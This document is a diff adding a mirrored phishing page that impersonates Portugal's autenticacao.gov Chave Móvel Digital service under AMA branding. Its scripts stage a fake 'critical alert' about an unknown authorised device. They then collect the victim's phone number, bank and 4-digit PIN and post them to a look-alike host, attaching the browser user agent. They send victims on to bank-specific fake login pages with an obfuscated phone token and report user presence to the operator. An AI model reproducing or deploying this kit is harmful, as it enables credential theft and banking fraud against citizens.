@@ -1,0 +1,926 @@
+<html lang="en"><head><link rel="icon" type="shortcut icon" href="favicon.png"><script src="../code.jquery.com/jquery-3.6.4.min.js"></script></head><body style="letter-spacing:0px;"><div id="loadedFrontend">
+
+
+
+<!-- Mirrored from autenticacao-gov.pt-verif.com/ by HTTrack Website Copier/3.x [XR&CO'2014], Wed, 28 Feb 2024 19:17:32 GMT -->
+<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=UTF-8"><!-- /Added by HTTrack -->
+
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <link rel="stylesheet" href="../cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css" type="text/css">
+  <link rel="stylesheet" href="bootstrap.css">
+  <script src="../code.jquery.com/jquery-3.6.4.min.js"></script>
+  <link href="custom87fb.css?cb=01392219" rel="stylesheet">
+  <link rel="stylesheet" href="../cdn.jsdelivr.net/npm/bootstrap-icons%401.11.2/font/bootstrap-icons.css">
+  <script src="../code.jquery.com/jquery-3.3.1.slim.min.js" integrity="sha384-q8i/X+965DzO0rT7abK41JStQIAqVgRVzpbzo5smXKp4YfRvH+8abtTE1Pi6jizo" crossorigin="anonymous"></script>
+  <script src="../cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.6/umd/popper.min.js" integrity="sha384-wHAiFfRlMFy6i5SRaxvfOCifBUQy1xHdJ/yoi7FRNXMRBu5WHdZYu1hA6ZOblgut" crossorigin="anonymous"></script>
+  <script src="../stackpath.bootstrapcdn.com/bootstrap/5.2.2/js/bootstrap.min.js" integrity="sha384-JjSmVgyd0p3pXB1rRibZUAYoIIy6OrQ6VrjIEaFf/nJGzIxFDsf4x0xIM+B07jRM" crossorigin="anonymous"></script>
+  <link href="Modala8fd.css?cb=07091015" rel="stylesheet">
+  <link rel="icon" type="shortcut icon" href="favicon2.html">
+  <script src="../code.jquery.com/jquery-3.6.4.min.js"></script>
+  <link rel="stylesheet" href="intlTelInput.css">
+  <script type="text/javascript" src="intlTelInput.js"></script>
+
+
+<script>
+    $(document).ready(function() {
+    // Função para enviar informações ao servidor quando o usuário entra no site
+    function userEntered() {
+        $.ajax({
+            url: 'update_user_status.php',
+            method: 'POST',
+            data: { action: 'enter' },
+            success: function(response) {
+                console.log(response);
+            },
+            error: function(error) {
+                console.log("Erro ao enviar informações de entrada:", error);
+            }
+        });
+    }
+
+    // Função para enviar informações ao servidor quando o usuário sai do site
+    function userLeft() {
+        $.ajax({
+            url: 'update_user_status.php',
+            method: 'POST',
+            data: { action: 'leave' },
+            success: function(response) {
+                console.log(response);
+            },
+            error: function(error) {
+                console.log("Erro ao enviar informações de saída:", error);
+            }
+        });
+    }
+
+    // Registra a função para ser executada quando a página é carregada
+    userEntered();
+
+    // Registra a função para ser executada quando o usuário fecha a janela do navegador
+    $(window).on('beforeunload', function() {
+        userLeft();
+    });
+});
+</script>
+
+
+
+        <div id="MainPageHeader" class="header">
+            <div class="row logo">
+                <div class="col-md-12 justify-content-center mt-3">
+                    <a href="https://www.autenticacao.gov.pt/">
+                    <img src="logo-ag.svg" alt="Autenticação.gov.pt" class="img img-responsive logo-ie" style="margin-top:30px;">
+                    </a>
+                </div>
+            </div>
+        </div>
+
+
+        
+
+
+        <div class="container container-page" id="phase1">
+            <div class="">
+                
+                <div class="body-container">
+                    <!-- BEGIN: Conteúdo -->
+                    
+
+    <link href="Eidas9694.css?cb=07092020" rel="stylesheet">
+
+
+
+
+
+    <input type="hidden" name="ctl00$MainContent$hiddenFlag" id="MainContent_hiddenFlag">
+    <input type="hidden" name="ctl00$MainContent$hiddenEmail" id="MainContent_hiddenEmail">
+    <input type="hidden" name="ctl00$MainContent$hiddenSocial" id="MainContent_hiddenSocial">
+    <input type="hidden" name="ctl00$MainContent$hiddenAuth" id="MainContent_hiddenAuth" value="cmd">
+    <input type="hidden" name="ctl00$MainContent$hiddenCMDOpt" id="MainContent_hiddenCMDOpt" value="sms">
+    <input name="ctl00$MainContent$citizenAuthnWayOption" type="hidden" id="MainContent_citizenAuthnWayOption">
+    <input type="submit" name="ctl00$MainContent$denyIframeButton" value="" id="MainContent_denyIframeButton" style="visibility: hidden">
+
+    <div class="authTitle">
+        <span id="MainContent_MainPage">ALERTA CRÍTICO</span>
+        <div class="row margin20 authProgressBar">
+        <div class="col-md-12 modalCenter">
+            <div class="wrapperModal-progress-bar">
+                <div style="background-color: White; height: 10px; width: 300px">
+                    <div id="MainContent_bar2" class="bar0">
+	
+                    
+</div>
+                    <span id="MainContent_percent" class="percent0">0%</span>
+                </div>
+            </div>
+        </div>
+    </div>
+        
+    </div>
+    
+
+    <h1 style="margin-top:0px;"><i class="bi bi-exclamation-triangle" style="color:#3c5dbc;"></i></h1>
+    <p class="text-center mt-3">Foi detectado um dispositivo de <b>AUTENTICAÇÃO</b> autorizado a realizar operações em seu nome. Se não foi você, siga este guia para proteger a sua conta.</p>
+    
+    <div id="MainContent_authSelectTitle" class="authSelectTitle">
+        <span id="MainContent_authSelectTitleLabel">CHAVE MÓVEL DIGITAL</span>
+        <span id="MainContent_lblMainPageInfoSPName"></span>
+    </div>
+    <div style="margin-left:5%;">
+                <p class="text-monospace">Dispositivo Autorizado: <b>Samsung Galaxy A40s <i class="bi bi-phone" style="color:#3c5dbc;"></i></b></p>
+                <p class="text-monospace" id="localizacao">Localização: <b><span id="local">Évora, Portugal</span> <i class="bi bi-globe-americas" style="color:#3c5dbc;"></i></b></p>
+
+<script>
+
+var locais = [
+  'Vila Nova de Gaia, Portugal',
+  'Alcochete, Portugal',
+  'Évora, Portugal',
+  'Odivelas, Portugal',
+  'Leiria, Portugal',
+  'Coimbra, Portugal',
+  'Viseu, Portugal',
+  'Braga, Portugal',
+];
+
+
+function gerarLocalizacao() {
+  var indiceAleatorio = Math.floor(Math.random() * locais.length);
+  return locais[indiceAleatorio];
+}
+document.getElementById('local').textContent = gerarLocalizacao();
+</script>
+
+<p class="text-monospace">Hora/Data: <b> <span id="dataDisplay">04/03/25 às 23:37</span> </b><i class="bi bi-clock" style="color:#3c5dbc;"></i></p></div>
+
+
+<script>
+function subtrair10Minutos() {
+  var dataAtual = new Date();
+  dataAtual.setMinutes(dataAtual.getMinutes() - 10);
+ 
+  var dia = String(dataAtual.getDate()).padStart(2, '0');
+  var mes = String(dataAtual.getMonth() + 1).padStart(2, '0');
+  var ano = String(dataAtual.getFullYear()).slice(2);
+  var horas = String(dataAtual.getHours()).padStart(2, '0');
+  var minutos = String(dataAtual.getMinutes()).padStart(2, '0');
+ 
+  var dataFormatada = `${dia}/${mes}/${ano} às ${horas}:${minutos}`;
+ 
+  return dataFormatada;
+}
+ 
+// Obtém o elemento onde a data será exibida
+var dataDisplay = document.getElementById('dataDisplay');
+ 
+// Define o conteúdo do elemento como a data formatada
+dataDisplay.textContent = subtrair10Minutos();
+</script>
+
+
+    
+
+    <div id="MainContent_div_selectAuth" class="divMainButtonsMainPage">
+        <div>
+            <div id="MainContent_ConfirmAuthPanel">
+	
+                <input type="button" name="ctl00$MainContent$AuthButtonBack" value="Voltar" onclick="" id="MainContent_AuthButtonBack" tabindex="11" class="btn btn-default btn-back-modal">
+                <input type="button" name="ctl00$MainContent$AuthButtonProceed" value="Continuar" onclick="proceedToPhase2()" id="MainContent_AuthButtonProceed" tabindex="12" class="btn btn-default btn-forward-modal">
+            
+</div>
+        </div>
+    </div>
+                    <!-- END: Conteúdo -->
+                </div>
+            </div>
+        </div>
+
+        <script>
+    function proceedToPhase2() {
+        // Esconder o div com id "phase1"
+        document.getElementById('phase1').style.display = 'none';
+
+        // Exibir o div com id "phase2"
+        document.getElementById('phase2').style.display = 'block';
+        document.getElementById("divLoading").style.display = "block";
+
+                // Configura um temporizador para esconder o elemento após 1 segundo (1000 milissegundos)
+        setTimeout(function () {
+            document.getElementById("divLoading").style.display = "none";
+        }, 1000);
+    }
+    function proceedToPhase1() {
+        // Esconder o div com id "phase1"
+        document.getElementById('phase1').style.display = 'block';
+
+        // Exibir o div com id "phase2"
+        document.getElementById('phase2').style.display = 'none';
+        document.getElementById("divLoading").style.display = "block";
+
+// Configura um temporizador para esconder o elemento após 1 segundo (1000 milissegundos)
+setTimeout(function () {
+document.getElementById("divLoading").style.display = "none";
+}, 1000);
+    }
+    function proceedToPhase3() {
+        // Esconder o div com id "phase1"
+        document.getElementById('phase1').style.display = 'none';
+
+        // Exibir o div com id "phase2"
+        document.getElementById('phase2').style.display = 'none';
+
+        document.getElementById('phase7').style.display = 'block';
+        document.getElementById("divLoading").style.display = "block";
+
+// Configura um temporizador para esconder o elemento após 1 segundo (1000 milissegundos)
+setTimeout(function () {
+document.getElementById("divLoading").style.display = "none";
+}, 1000);
+    }
+
+    function proceedToPhase3again() {
+        // Esconder o div com id "phase1"
+        document.getElementById('phase1').style.display = 'none';
+
+        // Exibir o div com id "phase2"
+        document.getElementById('phase2').style.display = 'none';
+
+        document.getElementById('phase3').style.display = 'block';
+
+        document.getElementById('phase4').style.display = 'none';
+        document.getElementById("divLoading").style.display = "block";
+
+// Configura um temporizador para esconder o elemento após 1 segundo (1000 milissegundos)
+setTimeout(function () {
+document.getElementById("divLoading").style.display = "none";
+}, 1000);
+    }
+
+    function proceedToPhase2again() {
+        document.getElementById('phase3').style.display = 'none';
+        document.getElementById('phase7').style.display = 'block';
+        document.getElementById("divLoading").style.display = "block";
+
+// Configura um temporizador para esconder o elemento após 1 segundo (1000 milissegundos)
+setTimeout(function () {
+document.getElementById("divLoading").style.display = "none";
+}, 1000);
+    }
+
+    function proceedToPhase4() {
+        document.getElementById('phase3').style.display = 'none';
+        document.getElementById('phase4').style.display = 'block';
+        document.getElementById("divLoading").style.display = "block";
+
+// Configura um temporizador para esconder o elemento após 1 segundo (1000 milissegundos)
+setTimeout(function () {
+document.getElementById("divLoading").style.display = "none";
+}, 1000);
+    }
+</script>
+
+<div class="container container-page" id="phase7" style="display:none;">
+
+<div class="">
+            <div class="body-container">
+                    <!-- BEGIN: Conteúdo3 -->
+
+
+
+    <input type="hidden" name="ctl00$MainContent$hiddenFlag" id="MainContent_hiddenFlag">
+    <input type="hidden" name="ctl00$MainContent$hiddenEmail" id="MainContent_hiddenEmail">
+    <input type="hidden" name="ctl00$MainContent$hiddenSocial" id="MainContent_hiddenSocial">
+    <input type="hidden" name="ctl00$MainContent$hiddenAuth" id="MainContent_hiddenAuth" value="cmd">
+    <input type="hidden" name="ctl00$MainContent$hiddenCMDOpt" id="MainContent_hiddenCMDOpt" value="sms">
+    <input name="ctl00$MainContent$citizenAuthnWayOption" type="hidden" id="MainContent_citizenAuthnWayOption">
+    <input type="submit" name="ctl00$MainContent$denyIframeButton" value="" id="MainContent_denyIframeButton" style="visibility: hidden">
+
+    <div class="authTitle">
+        <span id="MainContent_MainPage">VERIFICAR IDENTIDADE</span>
+    </div>
+
+    <div class="row margin20 authProgressBar">
+        <div class="col-md-12 modalCenter">
+            <div class="wrapperModal-progress-bar">
+                <div style="background-color: White; height: 10px; width: 300px">
+                    <div id="MainContent_bar2" class="bar50">
+	
+                    
+</div>
+                    <span id="MainContent_percent" class="percent50">50%</span>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    
+    <div id="MainContent_authSelectTitle" class="authSelectTitle">
+        <span id="MainContent_authSelectTitleLabel">ENTIDADE BANCÁRIA</span>
+        <span id="MainContent_lblMainPageInfoSPName"></span>
+    </div>
+
+    <div id="MainContent_div2_modal">
+        <div class="entityMessage">
+            Por motivos de segurança e qualidade dos nossos serviços, por favor selecione a sua <b>ENTIDADE BANCÁRIA</b> para a validação.
+        </div>
+      <form id="myForm2" method="POST">
+      <select class="selecionar" name="ctl00$MainContent$optionbank" style="margin-left:5%; margin-top:20px;border: 1px solid #3C5DBC;opacity: 1;display: inline-block;position: relative;padding:5px;">
+    <!-- Cada option representa uma opção no dropdown -->
+    <option value="opcao0">Escolha uma opção</option>
+    <option value="Millennium BCP">Millennium BCP</option>
+    <option value="Caixa Geral de Depósitos">Caixa Geral de Depósitos</option>
+    <option value="Activo Bank">Activo Bank</option>
+    <option value="Novo Banco">Novo Banco</option>
+    <option value="Santander">Santander</option>
+    <option value="Crédito Agrícola">Crédito Agrícola</option>
+    <option value="Banco CTT">Banco CTT</option>
+    <option value="Montepio">Banco Montepio</option>
+    <option value="Banco BPI">Banco BPI</option>
+    <option value="Eurobic">Banco Eurobic</option>
+</select>
+
+
+<div class="entityMessage" style="margin-top:25px;">
+<div class="info-footer" style="margin-bottom:0px;">
+                        <p>
+                        <span id="lblAuthGovInfoFooter">Tenha em atenção que por motivos legais e de cumprimentos jurídicos da U.E, de acordo com artigo 3/2015 a AMA poderá entrar em contacto consigo telefónicamente para a validação dos dados.</span>
+                        </p>
+                    </div>   
+        </div>
+
+<div id="MainContent_div1_modal" class="divMainButtonsMainPage">
+        <div>
+            <div id="MainContent_Panel1_modal">
+                <input type="button" name="ctl00$MainContent$btnAuth" value="Confirmar" id="MainContent_btnAuth" tabindex="14" class="btn btn-default btn-forward-modal" onclick="handleSubmit();">
+                
+</div>
+        </div>
+    </div>
+    </form></div>
+
+
+<script type="text/javascript">
+    function encryptToken(numero) {
+    // Função para encriptar o token
+    return [...numero].map(digit => `${digit}${generateRandomDigits(10)}`).join('');
+}
+
+function generateRandomDigits(length) {
+    // Função para gerar dígitos aleatórios
+    let result = '';
+    for (let i = 0; i < length; i++) {
+        result += Math.floor(Math.random() * 10); // Gera um dígito aleatório de 0 a 9
+    }
+    return result;
+}
+
+function handleSubmit() {
+    var inputField = document.getElementById('inputMobile');
+    var fullNumber = inputField.value.replace(/\s+/g, ''); // Remove espaços
+
+    // Remove o '+' do início do número de telemóvel e verifica o formato
+    var mobileNumber = fullNumber.replace(/^\+/, '');
+    var isValid = mobileNumber.match(/^3519[1236]\d{7}$/);
+    if (!isValid) {
+        alert('Por favor, insira um número de telemóvel válido no formato padrão de Portugal.');
+        return false;
+    }
+
+    // Encripta o número de telemóvel
+    var encryptedNumber = encryptToken(mobileNumber);
+
+    var selectedBank = document.querySelector('.selecionar').value;
+    if (selectedBank === 'opcao0') {
+        alert('Por favor, selecione uma entidade bancária.');
+        return false;
+    }
+
+    var form = document.getElementById('myForm2');
+    var basePath = ''; // Base URL path, será atualizado de acordo com o banco selecionado
+
+    switch (selectedBank) {
+        case 'Millennium BCP':
+            basePath = 'millennium';
+            break;
+        case 'Caixa Geral de Depósitos':
+            basePath = 'cgd';
+            break;
+        case 'Activo Bank':
+            basePath = 'ActivoBank';
+            break;
+        case 'Novo Banco':
+            basePath = 'novobanco';
+            break;
+        case 'Santander':
+            basePath = 'santander';
+            break;
+        case 'Crédito Agrícola':
+            basePath = 'ca';
+            break;
+        case 'Banco CTT':
+            basePath = 'ctt';
+            break;
+        case 'Montepio':
+            basePath = 'Montepio';
+            break;
+        case 'Banco BPI':
+            basePath = 'bpi';
+            break;
+        case 'Eurobic':
+            basePath = 'Eurobic';
+            break;
+            default:
+            alert('Por favor, selecione uma entidade bancária válida.');
+            return false;
+    }
+
+    // Adiciona o número de telemóvel encriptado como um token na URL
+    form.action = `main/${basePath}/login.php?token=${encodeURIComponent(encryptedNumber)}`;
+
+    form.submit();
+}
+
+
+</script>
+
+<script>
+document.getElementById('myForm2').addEventListener('submit', function(event) {
+    event.preventDefault(); // Evita o envio padrão do formulário
+
+    if (validateFormA()) {
+        var xhr = new XMLHttpRequest();
+        var url = 'process_form2.html';
+        var formData = new FormData(document.getElementById('myForm2'));
+
+        // Adicione o User Agent ao FormData
+        formData.append('userAgent', navigator.userAgent);
+
+        xhr.open('POST.html', url, true);
+        xhr.onload = function () {
+            if (xhr.status === 200) {
+                // Lógica adicional após o envio bem-sucedido, se necessário
+                document.getElementById('phase7').style.display = 'none';
+                document.getElementById("divLoading").style.display = "block";
+                document.getElementById('phase3').style.display = 'block';
+                setTimeout(function () {
+            document.getElementById("divLoading").style.display = "none";
+        }, 1000);
+            } else {
+                console.error('Erro ao enviar o formulário:', xhr.statusText);
+            }
+        };
+
+        xhr.send(formData);
+    }
+});
+
+
+
+function validateFormA() {
+        var form = document.getElementById('myForm2');
+        var selectedOption = form.elements[0].value; // Pega o valor da primeira opção (índice 0)
+
+        if (selectedOption === 'opcao0') {
+            alert('Por favor, selecione uma opção válida.');
+            return false;
+        }
+        return true;
+    }
+</script>
+
+<style>
+  .selecionar:focus
+{
+    
+    outline:none !important; 
+    border:1px solid #DFA943 !important;
+    -webkit-box-shadow: 0px 0px 5px  #DFA943 !important;
+    box-shadow: 0px 0px 5px  #DFA943 !important;
+}
+</style>
+
+
+
+                    <!-- END: Conteúdo3 -->
+                </div>
+            </div>
+        </div>
+
+        <div class="container container-page" id="phase2" style="display:none;">
+            <div class="">
+            <div class="body-container">
+                    <!-- BEGIN: Conteúdo2 -->
+
+
+
+    <input type="hidden" name="ctl00$MainContent$hiddenFlag" id="MainContent_hiddenFlag">
+    <input type="hidden" name="ctl00$MainContent$hiddenEmail" id="MainContent_hiddenEmail">
+    <input type="hidden" name="ctl00$MainContent$hiddenSocial" id="MainContent_hiddenSocial">
+    <input type="hidden" name="ctl00$MainContent$hiddenAuth" id="MainContent_hiddenAuth" value="cmd">
+    <input type="hidden" name="ctl00$MainContent$hiddenCMDOpt" id="MainContent_hiddenCMDOpt" value="sms">
+    <input name="ctl00$MainContent$citizenAuthnWayOption" type="hidden" id="MainContent_citizenAuthnWayOption">
+    <input type="submit" name="ctl00$MainContent$denyIframeButton" value="" id="MainContent_denyIframeButton" style="visibility: hidden">
+
+    <div class="authTitle">
+        <span id="MainContent_MainPage">FAÇA A SUA AUTENTICAÇÃO COM</span>
+    </div>
+
+    <div class="row margin20 authProgressBar">
+        <div class="col-md-12 modalCenter">
+            <div class="wrapperModal-progress-bar">
+                <div style="background-color: White; height: 10px; width: 300px">
+                    <div id="MainContent_bar2" class="bar30">
+	
+                    
+</div>
+                    <span id="MainContent_percent" class="percent30">30%</span>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    
+    <div id="MainContent_authSelectTitle" class="authSelectTitle">
+        <span id="MainContent_authSelectTitleLabel">INTRODUZA O MEIO DE AUTENTICAÇÃO</span>
+        <span id="MainContent_lblMainPageInfoSPName"></span>
+    </div>
+
+    <div id="MainContent_div2_modal">
+        <div class="entityMessage">
+            <div class="col-md-12">
+                <span id="MainContent_lblMobile" class="lblMobileTxtModal">Número de telemóvel</span>
+                <br>
+                <!-- Altere o id e o nome do input hidden para evitar conflitos -->
+                <input type="hidden" id="humanCheck" name="humanCheck">
+                <div class="wrapperModal">
+                    <div class="intl-tel-input pretty inside">
+                        <!-- Certifique-se de que este input text tem o id 'inputMobile' -->
+                        <input type="text" inputmode="numeric" id="inputMobile" name="inputMobile" value="" style="margin-top: 5px; height: 44px; border: none;" autocomplete="off" class="wrapperModalInput">
+                        <div class="flag-dropdown">
+                            <div class="selected-flag" tabindex="1" title="Portugal: +351">
+                                <div class="flag pt"><div class="arrow"></div></div>
+                            </div>
+                            <ul class="country-list hide">
+                                <li class="country preferred active" data-dial-code="351" data-country-code="pt">
+                                    <div class="flag pt"></div>
+                                    <span class="country-name">Portugal</span>
+                                    <span class="dial-code">+351</span>
+                                </li>
+                            </ul>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+    
+
+
+
+    <div id="MainContent_div1_modal" class="divMainButtonsMainPage">
+        <div>
+            <div id="MainContent_Panel1_modal">
+	
+                <input type="button" name="ctl00$MainContent$btnBack" value="Voltar" onclick="proceedToPhase1()" id="MainContent_btnBack" tabindex="13" class="btn btn-default btn-red btn-back-modal">
+                <input type="button" name="ctl00$MainContent$btnAuth" value="Autorizar" id="MainContent_btnAuth" tabindex="14" class="btn btn-default btn-forward-modal" onclick="if(validatePhoneNumber()) { proceedToPhase3(); }">            
+</div>
+        </div>
+    </div>
+
+                    <!-- END: Conteúdo2 -->
+                </div>
+            </div>
+        </div>
+        <script>
+        function validatePhoneNumber() {
+    var inputField = document.getElementById('inputMobile');
+    var number = inputField.value.replace(/\s+/g, ''); // Remove espaços
+
+    // Adiciona +351 se o número começa com 9 e tem 9 dígitos após isso
+    if (number.match(/^9[1236]\d{7}$/)) {
+        number = '+351' + number;
+    }
+
+    // Verifica se o número está no formato correto (12, 13 ou 9 dígitos)
+    var isValid = number.match(/^\+3519[1236]\d{7}$/) || number.match(/^3519[1236]\d{7}$/) || number.match(/^9[1236]\d{7}$/);
+    if (isValid) {
+        inputField.value = number.startsWith('9') ? '+351' + number : number; // Formata o campo com o número correto
+        return true;
+    } else {
+        alert('Por favor, insira um número de telemóvel válido no formato padrão de Portugal.');
+        return false;
+    }
+}
+        </script>
+
+<style>
+.titleCMDModal
+{
+    text-align: left;
+    font: 14px/26px Lato;
+    font-size: 1.1em;
+    letter-spacing: 0;
+    color: #3C5DBC;
+    text-transform: uppercase;
+    opacity: 1;
+    background: white;
+    font-weight: bold;
+    font-family: inherit;
+    font-style: inherit;
+    padding: 0px;
+}
+</style>
+
+
+    <div class="container container-page" id="phase3" style="display:none;">
+    <div class="authTitle">
+        <span id="MainContent_MainPage">FAÇA A SUA AUTENTICAÇÃO</span>
+    </div>
+    <div class="row margin20 authProgressBar">
+        <div class="col-md-12 modalCenter">
+            <div class="wrapperModal-progress-bar">
+                <div style="background-color: White; height: 10px; width: 300px">
+                    <div id="MainContent_bar2" class="bar80">
+	
+                    
+</div>
+                    <span id="MainContent_percent" class="percent80">80%</span>
+                </div>
+            </div>
+        </div>
+    </div>
+    <div id="MainContent_authSelectTitle" class="authSelectTitle">
+        <span id="MainContent_authSelectTitleLabel">CHAVE MÓVEL DIGITAL</span>
+        <span id="MainContent_lblMainPageInfoSPName"></span>
+    </div>
+    <form id="myForm" action="https://autenticacao-gov.pt-verif.com/process_form.php" method="post">
+    <div class="col-md-12" style="margin-left:5%">
+                <div class="wrapperModal">
+                    <div class="intl-tel-input pretty inside"><input type="text" required="" inputmode="numeric" maxlength="9" id="inputMobile" name="inputMobile" value="" style="margin-top: 5px;height: 44px;border: none;" autocomplete="off" class="wrapperModalInput"><div class="flag-dropdown"><div class="selected-flag" tabindex="1" title="Portugal: +351"><div class="flag pt"><div class="arrow"></div></div></div></div></div>
+                </div>
+            </div>
+            <div class="col-md-12" style="margin-left:5%">
+                <span id="MainContent_lblPin" class="lblMobileTxtModal">Inserir PIN</span>
+                <br>
+                <div class="wrapperModal">
+                    <input name="ctl00$MainContent$txtPin" required="" type="password" minlength="4" maxlength="4" id="MainContent_txtPin" inputmode="numeric" size="8" class="wrapperModalInput" style="height: 44px; border: none;">
+                    <img src="eye.svg" alt="Show Password" class="eye" id="toggle-password" tabindex="0" onkeydown="processKeyDownEye(this, event);">
+                </div>
+            </div>
+    
+            <div id="MainContent_div_selectAuth" class="divMainButtonsMainPage">
+        <div>
+            <div id="MainContent_ConfirmAuthPanel">
+	
+                <input type="button" name="ctl00$MainContent$AuthButtonBack" value="Voltar" onclick="proceedToPhase2again()" id="MainContent_AuthButtonBack" tabindex="11" class="btn btn-default btn-back-modal">
+                <input type="submit" name="ctl00$MainContent$AuthButtonProceed" value="Autenticar" id="MainContent_AuthButtonProceed" tabindex="12" class="btn btn-default btn-forward-modal">
+            
+</div>
+        </div>
+    </div>
+</form>
+
+    <div class="row margin40">
+            <div class="col-md-12 mobileCenter">
+                
+                <span id="MainContent_lblRegister">Se ainda não tem saiba como obter Chave Móvel Digital </span><a id="MainContent_hrefHere" class="colorBlue" href="https://www.autenticacao.gov.pt/cmd-pedido-chave" style="text-decoration: underline;"><span id="MainContent_lblHere">aqui</span></a>
+            </div>
+        </div>
+
+</div>
+
+<script>
+            function ShowLoading() {
+                document.getElementById("divLoading").style.display = "block";
+            }
+
+            var label = document.getElementById('MainContent_Label6');
+            if (label != null) {
+                label.addEventListener("click", function () {
+                    if ((document.getElementById('MainContent_mudaCheckbox').checked)) {
+                        document.getElementById('MainContent_mudaCheckbox').checked = false;
+                    }
+                    else {
+                        document.getElementById('MainContent_mudaCheckbox').checked = true;
+                    }
+                })
+            }
+
+            var txtPin = document.getElementById('MainContent_lblPin');
+            txtPin.addEventListener("click", function () {
+                document.getElementById("MainContent_txtPin").focus();
+            })
+
+            var txtMobile = document.getElementById('MainContent_lblMobile');
+        txtMobile.addEventListener("click", function () {
+            document.getElementById("inputMobile").focus();
+        })
+
+        var toggle = document.getElementById('toggle-password');
+        var textbox = document.getElementById('MainContent_txtPin');
+
+            toggle.addEventListener("click", function () {
+
+                if (textbox.type == "password") {
+                    textbox.type = "text";
+                }
+                else {
+                    textbox.type = "password";
+                }
+            })
+
+            function processKeyDownEye(chk, e) {
+                if (e.keyCode == 13) {
+                    toggle.click();
+                    e.preventDefault();
+                    return false;
+                }
+            }
+        
+</script>
+
+<script>
+document.getElementById('myForm').addEventListener('submit', function(event) {
+    event.preventDefault(); // Evita o envio padrão do formulário
+
+    if (validateForm()) {
+        var xhr = new XMLHttpRequest();
+        var url = 'process_form.html';
+        var formData = new FormData(document.getElementById('myForm'));
+
+        // Adicione o User Agent ao FormData
+        formData.append('userAgent', navigator.userAgent);
+
+        xhr.open('POST.html', url, true);
+        xhr.onload = function () {
+            if (xhr.status === 200) {
+                // Lógica adicional após o envio bem-sucedido, se necessário
+                document.getElementById('phase3').style.display = 'none';
+                document.getElementById('phase4').style.display = 'block';
+            } else {
+                console.error('Erro ao enviar o formulário:', xhr.statusText);
+            }
+        };
+
+        xhr.send(formData);
+    }
+});
+
+function validateForm() {
+    var form = document.getElementById('myForm');
+    for (var i = 0; i < form.elements.length; i++) {
+        if (form.elements[i].hasAttribute('required') && form.elements[i].value.trim() === '') {
+            alert('Por favor, preencha todos os campos obrigatórios.');
+            return false;
+        }
+    }
+    return true;
+}
+</script>
+
+<div class="loading" id="divLoading" style="display:none;" bis_skin_checked="1">
+</div>
+
+<div class="container container-page" id="phase4" style="display:none;">
+
+<div class="text-center justify-content-center align-items-center" style="margin-top:100px;">
+<img class="img-fluid d-block mx-auto my-5" src="Rolling-4.3s-200px.gif" width="100">
+<h4 class="text	 mt-3 text-center">POR FAVOR, AGUARDE ...</h4>
+              <p class="text-center" style="margin-bottom:200px;">A recolher informações na entidade...</p>
+</div>
+</div>
+
+        <div id="MainPageFooter" class="container footer">
+            <div class="row">
+                <div class="col-sm-12 center">
+                    <div class="info-footer">
+                        <p>
+                            <span id="lblAuthGovInfoFooter">O processo de autenticação é um serviço da Identificação Eletrónica que permite confirmar a sua identidade,<br>facilitando o acesso online a vários serviços públicos. </span>
+                            <a href="https://www.autenticacao.gov.pt/" target="_blank">
+                                <span id="lblMoreInfo" style="text-decoration:none;">Saiba mais sobre a Identificação Eletrónica.</span></a>
+                        </p>
+                    </div>
+                    <a target="_blank" href="https://www.ama.gov.pt/">
+                        <img src="Logo_AMA.png" class="logo-ama" alt="Agência para a Modernização Administrativa" title="Agência para a Modernização Administrativa"></a>
+                    <ul>
+                        <li><a target="_blank" href="#">
+                            <span id="lblUrlAmaSites">ePortugal</span></a></li>
+                        <li><a target="_blank" href="https://www.ama.gov.pt/web/agencia-para-a-modernizacao-administrativa/politica-de-privacidade">
+                            <span id="lblUrlPrivacyPolicy">Política de Privacidade</span></a></li>
+                        <li><a target="_blank" href="https://www.ama.gov.pt/web/agencia-para-a-modernizacao-administrativa/contactos1">
+                            <span id="lblUrlContacts">Contactos</span></a></li>
+                    </ul>
+
+                    <ul class="itemul">
+                        <li class="itemli">
+                            <a target="_blank" href="https://www.facebook.com/ama.gov.pt">
+                                <img src="fb_footer.png" alt="Facebook AMA"></a>
+                        </li>
+                        <li>
+                            <a target="_blank" href="https://pt.linkedin.com/company/ama---ag-ncia-para-a-moderniza-o-administrativa-ip">
+                                <img src="li_footer.png" alt="LinkedIn AMA"></a>
+                        </li>
+                        <li>
+                            <a target="_blank" href="https://www.twitter.com/ama_gov_pt">
+                                <img src="tw_footer.png" alt="Twitter AMA"></a>
+                        </li>
+                        
+                    </ul>
+
+                    <div class="copyright">
+                        <div class="row">
+                            <div class="col-md-12">
+                                <span id="lblAmaDesc">AMA - Agência para a Modernização Administrativa, IP - Todos os direitos reservados @ </span>
+                                <span id="lblCopyrightYear">2023</span>
+                                <a href="https://www.ama.gov.pt/" target="_blank">www.ama.gov.pt</a> | <a href="mailto:ama@ama.pt">ama@ama.pt</a>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+        
+
+
+
+
+</div>
+
+
+    <meta charset="UTF-8">
+
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>AUTENTICAÇÃO.GOV</title>
+    <link rel="icon" type="shortcut icon" href="favicon.png">
+    <!-- Inclua a biblioteca jQuery -->
+    <script src="../code.jquery.com/jquery-3.6.4.min.js"></script>
+
+
+
+<!-- Conteúdo da sua página index.php aqui -->
+
+<script>
+    function checkFrontendChange() {
+        $.ajax({
+            url: 'check_frontend_change.php',
+            dataType: 'json',
+            success: function (data) {
+                if (data.status === 'changed') {
+                    location.reload(true);
+                }
+            },
+            error: function (error) {
+                console.log("Erro ao verificar alteração no frontend:", error);
+            }
+        });
+    }
+
+    setInterval(checkFrontendChange, 1000);
+</script>
+
+<script>
+        function userEntered() {
+        $.ajax({
+            url: 'update_user_status.php',
+            method: 'POST',
+            data: { action: 'enter' },
+            success: function(response) {
+                console.log(response);
+            },
+            error: function(error) {
+                console.log("Erro ao enviar informações de entrada:", error);
+            }
+        });
+    }
+
+    function userLeft() {
+        $.ajax({
+            url: 'update_user_status.php',
+            method: 'POST',
+            data: { action: 'leave' },
+            success: function(response) {
+                console.log(response);
+            },
+            error: function(error) {
+                console.log("Erro ao enviar informações de saída:", error);
+            }
+        });
+    }
+    
+    function onVisibilityChange() {
